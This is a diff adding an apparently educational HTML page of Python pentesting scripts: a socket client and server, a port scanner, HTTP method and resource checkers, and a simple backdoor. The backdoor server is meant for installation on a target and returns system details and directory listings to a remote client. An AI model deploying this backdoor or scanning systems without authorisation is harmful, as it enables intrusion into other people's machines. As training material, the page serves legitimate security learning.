@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Pentester Utils - Useful Commands</title>
+
+        <link rel="stylesheet" type="text/css" href="css/desert.css">
+        <link rel="stylesheet" type="text/css" href="css/custom_style.css">
+        <script type="text/javascript" src="js/run_prettify.js?autoload=false"></script>
+    </head>
+    <body onload="PR.prettyPrint()">
+        <ul class="nav">
+            <li><a href="index.html">Home</a></li>
+            <li><a href="useful_commands.html">Useful Commands</a></li>
+            <li><a href="python_scripts.html">Python Scripts</a></li>
+        </ul>
+        <hr>
+        <h1>Table of Content</h1>
+        <ol>
+            <li><a href="#cli-srv">Client &amp; Server</a>
+                <ul>
+                    <li><a href="#cs-cli">Client</a></li>
+                    <li><a href="#cs-srv">Server</a></li>
+                </ul>
+            </li>
+            <li><a href="#port-scanner">Port Scanner</a></li>
+            <li><a href="#backdoor">Backdoor</a>
+                <ul>
+                    <li><a href="#bd-srv">Server (to install on the target)</a></li>
+                    <li><a href="#bd-cli">Client</a></li>
+                </ul>
+            </li>
+            <li><a href="#http-methods">Enum HTTP Methods</a></li>
+            <li><a href="#http-methods">Enum HTTP Methods</a></li>
+        </ol>
+
+        <span style="color: red"><b><i>DISCLAIMER: all the code below are written for python3.</i></b></span>
+
+        <h1 id="cli-srv">Client &amp; Server</h1>
+        <p>Base client-server architecture</p>
+
+        <h2 id="cs-cli">Client</h2>
+        <a href="python_scripts/client.py" target="_blank">Get</a>
+        <p>
+<pre class="prettyprint">
+<code>
+import socket
+
+SRV_ADDR = input("Type the server IP address: ")
+SRV_PORT = int(input("Type the server port: "))
+
+print("Listening on {}:{}".format(SRV_ADDR, SRV_PORT))
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((SRV_ADDR, SRV_PORT))
+print("Connection enstablished...")
+
+message = input("Message to send: ")
+s.sendall(message.encode())
+s.close()
+</code>
+</pre>
+        </p>
+        
+        <h2 id="cs-srv">Server</h2>
+        <a href="python_scripts/server.py" target="_blank">Get</a>
+        <p>
+<pre class="prettyprint">
+<code>
+import socket
+
+SRV_ADDR = input("Type the server IP address: ")
+SRV_PORT = int(input("Type the server port: "))
+
+print("Listening on {}:{}".format(SRV_ADDR, SRV_PORT))
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((SRV_ADDR, SRV_PORT))
+s.listen(1)
+
+print("Server started! Waiting for connections...")
+connection, address = s.accept()
+print("Client connected with address: ", address)
+
+while 1:
+    data = connection.recv(1024)
+    if not data: break
+    print(data.decode('utf-8'))
+connection.close()
+</code>
+</pre>
+        </p>
+
+        <h1 id="port-scanner">Port Scanner</h1>
+        <p>
+            A simple port scanner (<a href="python_scripts/portscanner.py" target="_blank">Get</a>)
+        </p>
+        
+        <p>
+<pre class="prettyprint">
+<code>
+import socket
+
+target = input("Enter the IP address to scan: ")
+portrange = input("Enter the port range to scan (es 5-200): ")
+
+lowport = int(portrange.split('-')[0])
+highport = int(portrange.split('-')[1])
+
+print("Scanning host {} from port {} to port {}".format(target, lowport, highport))
+
+for port in range(lowport, highport):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    status = s.connect_ex((target, port))
+    if status == 0:
+        print("*** Port {} - OPEN ***".format(port))
+    else:
+        print("Port {} - CLOSED".format(port))
+    s.close()
+</code>
+</pre>
+        </p>
+
+        <h1 id="backdoor">Backdoor</h1>
+        <p>Simple example of how to send commands to an infected machine and retrieve system informations</p>
+
+        <h2 id="bd-srv">Server (to install on the target)</h2>
+        <a href="python_scripts/backdoor.py" target="_blank">Get</a>
+        <p>
+<pre class="prettyprint">
+<code>
+import socket, platform, os
+
+SRV_ADDR = ""
+SRV_PORT = 6666
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind((SRV_ADDR, SRV_PORT))
+s.listen(1)
+connection, address = s.accept()
+while 1:
+    try:
+        data = connection.recv(1024)
+    except: continue
+
+    if data.decode('utf-8') == '1':
+        tosend = platform.platform() + " " + platform.machine()
+        connection.sendall(tosend.encode())
+    elif data.decode('utf-8') == '2':
+        data = connection.recv(1024)
+        try:
+            filelist = os.listdir(data.decode('utf-8'))
+            tosend = ""
+            for x in filelist:
+                tosend += "," + x
+        except:
+            tosend = "Wrong path"
+        connection.sendall(tosend.encode())
+    elif data.decode('utf-8') == '0':
+        connection.close()
+        connection, address = s.accept()
+</code>
+</pre>
+        </p>
+        
+        <h2 id="bd-cli">Client</h2>
+        <a href="python_scripts/backdoor_client.py" target="_blank">Get</a>
+        <p>
+<pre class="prettyprint">
+<code>
+import socket
+
+SRV_ADDR = input("Type the server IP address: ")
+SRV_PORT = int(input("Type the server port: "))
+
+def print_menu():
+    print("""\n\n
+    1) Get System info
+    2) List directory contents
+    0) Close the connection
+    """)
+
+my_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+my_sock.connect((SRV_ADDR, SRV_PORT))
+
+print("Connection enstablished")
+print_menu()
+
+while 1:
+    message = input("\nSelect and option: ")
+
+    if message == "0":
+        my_sock.sendall(message.encode())
+        my_sock.close()
+        break
+
+    elif message == "1":
+        my_sock.sendall(message.encode())
+        data = my_sock.recv(1024)
+        if not data: break
+        print("OS: ", data.decode('utf-8'))
+
+    elif message == "2":
+        path = input("Insert the path: ")
+        my_sock.sendall(message.encode())
+        my_sock.sendall(path.encode())
+        data = my_sock.recv(1024)
+        data = data.decode('utf-8').split(",")
+        print("*"*40)
+        for x in data:
+            print(x)
+        print("*"*40)
+
+    print_menu()
+</code>
+</pre>
+        </p>
+
+        <h1 id="http-methods">Enum HTTP Methods</h1>
+        <p>
+            A simple program that returns a list of methods if OPTIONS is enabled (<a href="python_scripts/http_enum_methods.py" target="_blank">Get</a>)
+        </p>
+        
+        <p>
+<pre class="prettyprint">
+<code>
+import http.client
+
+print("** This program returns a list of methods if OPTIONS is enabled **\n")
+
+host = input("Insert the host/IP: ")
+port = input("Insert the port(default:80): ")
+if port == "":
+    port = 80
+
+try:
+    connection = http.client.HTTPConnection(host, port)
+    connection.request('OPTIONS', '/')
+    response = connection.getresponse()
+    print("Enabled methods are: ", response.getheader('allow'))
+    connection.close()
+except ConnectionRefusedError:
+    print("Connection failed")
+</code>
+</pre>
+        </p>
+
+        <h1 id="http-check-res">Check HTTP Resource</h1>
+        <p>
+            A simple program that checks if a specific resource is available on the webserver (<a href="python_scripts/http_check_resource.py" target="_blank">Get</a>)
+        </p>
+        
+        <p>
+<pre class="prettyprint">
+<code>
+import http.client
+
+print("** This program checks if a specific resource is available on the webserver **\n")
+
+host = input("Insert the host/IP: ")
+port = input("Insert the port(default:80): ")
+url = input("Insert the url: ")
+
+if port == "":
+    port = 80
+
+try:
+    connection = http.client.HTTPConnection(host, port)
+    connection.request('GET', url)
+    response = connection.getresponse()
+    if response.status == 200:
+        print("Resource FOUND on the server ({})".format(response.status))
+    elif response.status == 404:
+        print("Resource NOT FOUND on the server ({})".format(response.status))
+    elif response.status == 403:
+        print("Access to the resource FORBIDDEN ({})".format(response.status))
+    connection.close()
+except ConnectionRefusedError:
+    print("Connection failed")
+</code>
+</pre>
+        </p>
+
+    </body>
+</html>
